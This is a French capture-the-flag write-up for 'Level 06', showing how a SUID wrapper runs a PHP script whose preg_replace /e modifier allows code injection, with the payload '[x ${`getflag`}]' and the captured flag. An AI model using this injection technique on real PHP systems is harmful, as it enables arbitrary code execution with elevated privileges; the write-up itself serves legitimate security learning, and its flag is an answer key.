# Level 06

## 📋 Informations

- **Domaine** : Command Injection (PHP `preg_replace` /e modifier)
- **Objectif** : Exploiter un script PHP vulnérable lancé avec des privilèges élevés pour récupérer le flag.

---

## 🔍 Exploration

Nous trouvons deux fichiers intéressants dans le dossier home : un binaire `level06` et un script `level06.php`.

Commençons par examiner le binaire (via décompilation ou trace).

```c title:extrait_de_main
  __rgid = getegid();
  __ruid = geteuid();
  setresgid(__rgid,__rgid,__rgid);
  setresuid(__ruid,__ruid,__ruid);
  local_34 = "/usr/bin/php";
  local_30 = "/home/user/level06/level06.php";
  local_24 = 0;
  local_2c = __ptr;
  execve("/usr/bin/php",&local_34,__envp);
```

> [!NOTE]
> **Wrapper SUID**
> Ce binaire agit comme un wrapper. Il définit les GID et UID effectifs (probablement ceux de `flag06`) puis exécute le script PHP.
> Cela signifie que le script PHP s'exécutera avec des privilèges élevés (cf. [[UID - POSIX]]/[[GID - POSIX]]).

---

## 🛠️ Analyse

Analysons maintenant le script PHP exécuté :

```php title:level06.php
#!/usr/bin/php
<?php
function y($m) { 
	$m = preg_replace("/\./", " x ", $m);
	$m = preg_replace("/@/", " y", $m);
	return $m;
}

function x($y, $z) { 
	$a = file_get_contents($y);
	$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
	$a = preg_replace("/\[/", "(", $a);
	$a = preg_replace("/\]/", ")", $a);
	return $a;
}

$r = x($argv[1], $argv[2]); 
print $r;
?>
```

Le script prend deux arguments. Le premier est considéré comme un nom de fichier (`file_get_contents($y)`), et son contenu est traité par la fonction `x`.

On remarque immédiatement l'utilisation du modificateur `/e` dans `preg_replace`.

> [!IMPORTANT]
> **La faille : Modificateur `/e` (Eval)**
> Le modificateur `/e` (déprécié en PHP 5.5, supprimé en 7.0) indique à PHP d'évaluer la chaîne de remplacement comme du code PHP.
> Si la regex capture une partie de l'entrée utilisateur et l'insère dans la chaîne de remplacement, et que cette entrée contient du code PHP (comme `${ system(...) }` ou des backticks), ce code sera exécuté.

**Chronologie de la suppression de /e :**
*   PHP 5.5.0 (2013) : Déprécié.
*   PHP 7.0.0 (2015) : Supprimé.

---

## 🔓 Résolution

### 1. Construction du Payload

La regex est `/(\[x (.*)\])/e`. Elle match des chaînes de la forme `[x quelquechose]`.
Le remplacement est `"y(\"\\2\")"`, où `\\2` est le contenu capturé (le `quelquechose`).

Pour exploiter cela, nous pouvons utiliser la syntaxe de substitution de variable complexe `${}` qui est évaluée dans les chaînes entre guillemets doubles en PHP.

Créons un fichier contenant notre injection. Nous utilisons des `backticks` pour exécuter une commande shell lors de l'évaluation PHP.

```bash
echo '[x ${`getflag`}]' > /tmp/payload
```

### 2. Exécution

Nous exécutons le binaire `level06` en lui passant notre fichier piégé en premier argument.

```bash
./level06 /tmp/payload
```

### 3. Résultat

Le script PHP lit notre fichier, match le pattern, et lors de l'évaluation du remplacement, exécute `getflag`.

**Flag Final :**
```text
wiok45aaoguiboiki2tuin6ub
```

---

## 📚 Notions utiles

- **PHP Code Injection** : Comprendre comment `eval()` et le modificateur `/e` peuvent être abusés.
- **Regex** : Comprendre les captures et les remplacements.
- **SUID/SGID** : Comprendre pourquoi le binaire C était nécessaire pour l'élévation de privilèges.

### Ressources
- [RFC: Remove preg_replace /e modifier](https://wiki.php.net/rfc/remove_preg_replace_eval_modifier)

